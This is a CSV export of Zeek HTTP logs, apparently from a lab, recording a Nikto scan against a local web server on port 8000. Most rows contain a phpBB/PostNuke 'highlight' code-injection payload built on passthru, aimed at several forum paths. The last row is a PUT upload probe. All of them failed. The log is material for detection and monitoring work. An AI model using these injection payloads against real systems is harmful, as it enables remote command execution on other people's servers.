"@timestamp","_id","_ignored","_index","_score","agent.ephemeral_id","agent.id","agent.name","agent.name.text","agent.type","agent.version","data_stream.dataset","data_stream.namespace","data_stream.type","destination.address","destination.ip","destination.port","ecs.version","elastic_agent.id","elastic_agent.snapshot","elastic_agent.version","event.action","event.agent_id_status","event.category","event.created","event.dataset","event.id","event.ingested","event.kind","event.module","event.outcome","event.type","http.request.body.bytes","http.request.method","http.response.body.bytes","http.response.status_code","http.version","input.type","log.file.path","log.offset","network.community_id","network.transport","related.ip","source.address","source.ip","source.port",tags,"url.domain","url.extension","url.original","url.original.text","url.path","url.query","user_agent.device.name","user_agent.name","user_agent.original","user_agent.original.text","user_agent.os.full","user_agent.os.full.text","user_agent.os.name","user_agent.os.name.text","user_agent.os.version","user_agent.version","zeek.http.orig_fuids","zeek.http.orig_mime_types","zeek.http.resp_fuids","zeek.http.resp_mime_types","zeek.http.status_msg","zeek.http.trans_depth","zeek.session_id"
"Mar 7, 2025 @ 18:08:35.809",MfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CmkOyJUnBW4mliiuk,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,049,503","1:+IQLKdbti8HVcEdgdSK18XCaBqQ=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,264","forwarded, zeek-http","192.168.56.102",php,"/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FciBo51ENvsY0iNvVh,"text/html","File not found",1,CmkOyJUnBW4mliiuk
"Mar 7, 2025 @ 18:08:35.804",MPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",Cvp7cL2UxGiCeIjdxf,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,048,870","1:nWLu71vOeIRM/Sn+NVgVV7STKEA=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,258","forwarded, zeek-http","192.168.56.102",php,"/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FBKZ6h1B2InZ40pQgk,"text/html","File not found",1,Cvp7cL2UxGiCeIjdxf
"Mar 7, 2025 @ 18:08:35.800","L_PecpUBaT9JHWGjN8Xr","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CpDobB23G4dM4xjfec,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,048,236","1:XbqOtXQFCvtNfFYK7WLN/0FWZTI=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,242","forwarded, zeek-http","192.168.56.102",php,"/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FfloIB7wfb26qEY82,"text/html","File not found",1,CpDobB23G4dM4xjfec
"Mar 7, 2025 @ 18:08:35.792",LvPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CJCDsG3JqeeTKY2fp2,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,047,595","1:BXaYruYJop8n/dEKNwKsvY8HAzw=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,230","forwarded, zeek-http","192.168.56.102",php,"/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FA3Gur2Pnd2ouyZnVc,"text/html","File not found",1,CJCDsG3JqeeTKY2fp2
"Mar 7, 2025 @ 18:08:35.785",LfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CsXxmg38UyfSB9IuN7,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,046,960","1:Q4gcYMLI24K6HYZAjVGue2u4Jpk=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,226","forwarded, zeek-http","192.168.56.102",php,"/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FFuXyjElFFOAWQ6wi,"text/html","File not found",1,CsXxmg38UyfSB9IuN7
"Mar 7, 2025 @ 18:08:35.775",LPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CCLIfS2ktrmdQzHB0a,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,046,334","1:ykQL5oH9DlDhuxsyZTiG9vLp0+g=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,218","forwarded, zeek-http","192.168.56.102",php,"/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php","Nikto=forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F2cixa1VoBenhxgiT2,"text/html","File not found",1,CCLIfS2ktrmdQzHB0a
"Mar 7, 2025 @ 18:08:35.728",JfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",ClnUQipNYLEYT9oNh,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,041,908","1:nX9yELleOnT/1lmuFEk7RBlZ8kU=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,130","forwarded, zeek-http","192.168.56.102",php,"/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/forum/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",F3KKYCjfwlg61IHfk,"text/html","File not found",1,ClnUQipNYLEYT9oNh
"Mar 7, 2025 @ 18:08:35.721",JPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",CtsqwlLoXzjopJPti,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,041,276","1:uWUrqDrtDyGsOZ/JehU6uNZXE0w=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,128","forwarded, zeek-http","192.168.56.102",php,"/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/phpBB/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FR28Ml2X9uv0B0RJi6,"text/html","File not found",1,CtsqwlLoXzjopJPti
"Mar 7, 2025 @ 18:08:35.712","I_PecpUBaT9JHWGjN8Xr","-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.982","zeek.http",COyXPV1XbfuEEyp5rc,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,040,640","1:K3Gy6rUFSyWKYO/5ZhidzrBq9T0=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,124","forwarded, zeek-http","192.168.56.102",php,"/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/modules/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FLjnGL1O0gbUBu22hh,"text/html","File not found",1,COyXPV1XbfuEEyp5rc
"Mar 7, 2025 @ 18:08:35.706",IvPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CDEzvZ1ENb7fl1aewc,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,039,999","1:emcks6bhyYYGKzEc1MNnlwuqL8o=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,114","forwarded, zeek-http","192.168.56.102",php,"/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/html/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FhIKJw4tPoKyZ6Or3k,"text/html","File not found",1,CDEzvZ1ENb7fl1aewc
"Mar 7, 2025 @ 18:08:35.698",IfPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CU4apS1YVayMuBp048,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,039,363","1:dB8hwCg+2j/qWLnTWGS0lIxKWjg=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,112","forwarded, zeek-http","192.168.56.102",php,"/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/postnuke/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FLn1po48Vs3ayxOz4e,"text/html","File not found",1,CU4apS1YVayMuBp048
"Mar 7, 2025 @ 18:08:35.691",IPPecpUBaT9JHWGjN8Xr,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",GET,verified,"network, web","Mar 7, 2025 @ 18:08:35.981","zeek.http",CSDzA82QyMD2HUGj6f,"Mar 7, 2025 @ 18:08:40.000",event,zeek,failure,"connection, protocol, info",0,GET,335,404,"1.0",log,"/opt/zeek/logs/current/http.log","1,038,736","1:UDLgUtqL/ETjY/k5BN1hSYi/pM4=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","51,108","forwarded, zeek-http","192.168.56.102",php,"/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php?Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight=%27.passthru($HTTP_GET_VARS[rush]).%27","/index.php","Nikto=Forums&file=viewtopic&t=2&rush=dir&highlight='.passthru($HTTP_GET_VARS[rush]).'",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FXCUNM1wRUQAaZhxm4,"text/html","File not found",1,CSDzA82QyMD2HUGj6f
"Mar 7, 2025 @ 18:08:23.474",DzXecpUB2C2rFDMeCH2E,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",PUT,verified,"network, web","Mar 7, 2025 @ 18:08:25.847","zeek.http",CuxN8w2WRudZY47pVc,"Mar 7, 2025 @ 18:08:28.000",event,zeek,failure,"connection, protocol, info",22,PUT,356,501,"1.0",log,"/opt/zeek/logs/current/http.log","178,019","1:wZfpIr7wKzs09oCryHclkajs+D8=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","54,122","forwarded, zeek-http","192.168.56.102",html,"/nikto-test-PnyuQ9xv.html","/nikto-test-PnyuQ9xv.html","/nikto-test-PnyuQ9xv.html","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169",FPuC0E5BZAvuOpjRb,"text/plain",FHvdsUUoD3ioqyfvg,"text/html","Unsupported method ('PUT')",1,CuxN8w2WRudZY47pVc
